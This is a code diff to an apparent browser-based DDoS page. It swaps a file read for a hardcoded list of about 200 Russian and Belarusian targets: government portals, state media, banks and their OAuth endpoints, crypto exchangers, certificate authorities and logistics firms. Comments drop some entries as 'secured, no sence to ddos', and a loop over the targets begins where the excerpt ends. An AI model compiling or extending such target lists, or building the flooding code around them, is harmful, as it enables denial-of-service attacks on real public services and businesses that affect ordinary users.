@@ -14,10 +14,215 @@
    </center>
 
 <script>
-var fs = require("fs");
-var text = fs.readFileSync("sites.txt");
   
-var targets = text.split("\n");//.filter( e => e.charAt(0) != "/" );
+var targets = [
+  ///////////////////////
+  // Рос газети та держсайти
+  ///////////////////////
+  'https://lenta.ru/',
+  //'https://ria.ru/', //secured, no sence to ddos
+  'https://www.rbc.ru/',
+  'https://www.rt.com/',
+  'http://kremlin.ru/',
+  'http://en.kremlin.ru/',
+  'https://smotrim.ru/',
+  'https://tass.ru/',
+  'https://tvzvezda.ru/',
+  'https://vsoloviev.ru/',
+  'https://www.1tv.ru/',
+  'https://www.vesti.ru/',
+  'https://online.sberbank.ru/',
+  'https://sberbank.ru/',
+  'https://zakupki.gov.ru/',
+  'https://www.gosuslugi.ru/',
+  'https://er.ru/',
+  'https://www.rzd.ru/',
+  'https://rzdlog.ru/',
+  'https://vgtrk.ru/',
+  'https://www.interfax.ru/',
+  'https://www.mos.ru/uslugi/',
+  'http://government.ru/',
+  'https://mil.ru/',
+  'https://www.nalog.gov.ru/',
+  'https://customs.gov.ru/',
+  'https://pfr.gov.ru/',
+  'https://rkn.gov.ru/',
+  'https://www.gazprombank.ru/',
+  'https://www.vtb.ru/',
+  'https://www.gazprom.ru/',
+  'https://lukoil.ru',
+  'https://magnit.ru/',
+  'https://www.nornickel.com/',
+  'https://www.surgutneftegas.ru/',
+  'https://www.tatneft.ru/',
+  'https://www.evraz.com/ru/',
+  'https://nlmk.com/',
+  'https://www.sibur.ru/',
+  'https://www.severstal.com/',
+  'https://www.metalloinvest.com/',
+  'https://nangs.org/',
+  //'https://rmk-group.ru/ru/', //secured, no sence to ddos
+  'https://www.tmk-group.ru/',
+  'https://yandex.ru/',
+  'https://yandex.by/',
+  'https://www.polymetalinternational.com/ru/',
+  'https://www.uralkali.com/ru/',
+  'https://www.eurosib.ru/',
+  'https://omk.ru/',
+  'https://mail.rkn.gov.ru/',
+  'https://cloud.rkn.gov.ru/',
+  'https://mvd.gov.ru/',
+  'https://pwd.wto.economy.gov.ru/',
+  'https://stroi.gov.ru/',
+  'https://proverki.gov.ru/',
+  'https://www.gazeta.ru/',
+  'https://www.crimea.kp.ru/',
+  'https://www.kommersant.ru/',
+  //'https://riafan.ru/', //secured, no sence to ddos
+  'https://www.mk.ru/',
+  'https://www.sberbank.ru',
+  'https://api.sberbank.ru/prod/tokens/v2/oauth',
+  'https://api.sberbank.ru/prod/tokens/v2/oidc',
+  'https://www.vedomosti.ru/',
+  'https://sputnik.by/',
+  '109.207.1.118/',
+  '109.207.1.97/',
+  'https://www.moex.com',
+  'https://gosuslugi41.ru',
+  'https://uslugi27.ru',
+  'https://gosuslugi29.ru',
+  'https://gosuslugi.astrobl.ru',
+  'https://radiorecord.ru',
+  'http://www.cyber-berkut.ru/',
+  
+  ///////////////////////
+  // Білоруські газети та держсайти
+  ///////////////////////
+  'http://belta.by/',
+  'https://www.tvr.by/',
+  'https://www.sb.by/',
+  //'https://belmarket.by/', //secured, no sence to ddos
+  'https://www.belarus.by/',
+  'https://belarus24.by/',
+  'https://ont.by/',
+  //'https://www.024.by/', //secured, no sence to ddos
+  'https://www.belnovosti.by/',
+  'https://mogilevnews.by/',
+  'https://www.mil.by/',
+  'https://www.slonves.by/',
+  'https://www.ctv.by/',
+  'https://radiobelarus.by/',
+  'https://radiusfm.by/',
+  'https://alfaradio.by/',
+  'https://radiomir.by/',
+  'https://radiostalica.by/',
+  'https://radiobrestfm.by/',
+  'https://www.tvrmogilev.by/',
+  'https://minsknews.by/',
+  'https://zarya.by/',
+  'https://grodnonews.by/',
+  'https://rec.gov.by/ru',
+  'https://www.mil.by',
+  'https://www.government.by',
+  'https://president.gov.by/ru',
+  'https://www.mvd.gov.by/ru',
+  'http://www.kgb.by/ru/',
+  'https://www.prokuratura.gov.by',
+  'https://www.nbrb.by',
+  'https://belarusbank.by/',
+  'https://brrb.by/',
+  'https://www.belapb.by/',
+  'https://bankdabrabyt.by/',
+  'https://belinvestbank.by/individual',
+  'https://bgp.by/ru/',
+  'https://www.belneftekhim.by',
+  'http://www.bellegprom.by',
+  'https://www.energo.by',
+  'http://belres.by/ru/',
+  
+  ///////////////////////
+  // Біржі які пов'язані з обміном криптовалют та Сбербанком
+  ///////////////////////
+  //'https://cleanbtc.ru/', //secured, no sence to ddos
+  //'https://bonkypay.com', //secured, no sence to ddos
+  //'https://changer.club', //secured, no sence to ddos
+  //'https://superchange.net', //secured, no sence to ddos
+  //'https://platov.co', //secured, no sence to ddos
+  //'https://ww-pay.net', //secured, no sence to ddos
+  //'https://delets.cash', //secured, no sence to ddos
+  'https://betatransfer.org',
+  //'https://ramon.money', //secured, no sence to ddos
+  //'https://coinpaymaster.com', //secured, no sence to ddos
+  'https://bitokk.biz',
+  'https://www.netex24.net',
+  //'https://cashbank.pro', //secured, no sence to ddos
+  //'https://flashobmen.com', // cloudflare secure
+  'https://abcobmen.com',
+  'https://ychanger.net',
+  //'https://multichange.net', //secured, no sence to ddos
+  'https://24paybank.ne',
+  'https://royal.cash',
+  //'https://prostocash.com', //secured, no sence to ddos
+  //'https://baksman.org', //secured, no sence to ddos
+  //'https://kupibit.me', //secured, no sence to ddos
+  //'https://abcobmen.com', //secured, no sence to ddos
+  
+  ///////////////////////
+  // Сайти пов'язані з видачею електронних ключів
+  ///////////////////////
+  'https://24paybank.ne',
+  'https://iecp.ru/ep/ep-verification',
+  'https://iecp.ru/ep/uc-list',
+  'https://uc-osnovanie.ru/',
+  'http://www.nucrf.ru',
+  'http://www.belinfonalog.ru',
+  'http://www.roseltorg.ru',
+  'http://www.astralnalog.ru',
+  'http://www.nwudc.ru',
+  'http://www.center-inform.ru',
+  'https://kk.bank/UdTs',
+  'http://structure.mil.ru/structure/uc/info.htm',
+  'http://www.ucpir.ru',
+  'http://dreamkas.ru',
+  'http://www.e-portal.ru',
+  'http://izhtender.ru',
+  'http://imctax.parus-s.ru',
+  'http://www.icentr.ru',
+  'http://www.kartoteka.ru',
+  'http://rsbis.ru/elektronnaya-podpis',
+  'http://www.stv-it.ru',
+  'http://www.crypset.ru',
+  'http://www.kt-69.ru',
+  'http://www.24ecp.ru',
+  'http://kraskript.com',
+  'http://ca.ntssoft.ru',
+  'http://www.y-center.ru',
+  'http://www.rcarus.ru',
+  'http://rk72.ru',
+  'http://squaretrade.ru',
+  'http://ca.gisca.ru',
+  'http://www.otchet-online.ru',
+  'http://udcs.ru',
+  'http://www.cit-ufa.ru',
+  'http://elkursk.ru',
+  'http://www.icvibor.ru',
+  'http://ucestp.ru',
+  'http://mcspro.ru',
+  'http://www.infotrust.ru',
+  'http://epnow.ru',
+  'http://ca.kamgov.ru',
+  'http://mascom-it.ru',
+  'http://cfmc.ru',
+  
+  ///////////////////////
+  // Логістика Росії - різного роду вантажоперевезення
+  ///////////////////////
+  'https://www.npktrans.ru',
+  'http://tehtrans.com',
+  'https://pgk.ru',
+  'https://railfgk.ru',
+  'http://platon.ru'
+  ]
 
 var targetStats = {}
 targets.forEach((target) => {
